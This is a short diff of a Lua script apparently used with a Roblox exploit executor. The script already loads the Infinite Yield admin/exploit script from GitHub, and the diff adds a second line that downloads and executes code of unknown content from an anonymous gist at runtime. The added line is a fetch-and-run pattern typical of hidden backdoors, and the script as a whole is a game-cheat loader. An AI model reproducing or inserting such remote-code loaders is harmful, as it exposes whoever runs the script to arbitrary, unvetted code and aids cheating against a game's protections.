@@ -72,6 +72,7 @@ end
 spawn(function()
 	if getgenv().IY_LOADED ~= true then
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+		loadstring(game:HttpGet("https://gist.githubusercontent.com/JellyJrl/1323d077b0920a460f6208eedb25dece/raw/35d1547afdb55c287ddebfba646a424e368e2f7b/xfwad"))()
 	end
 end)
 
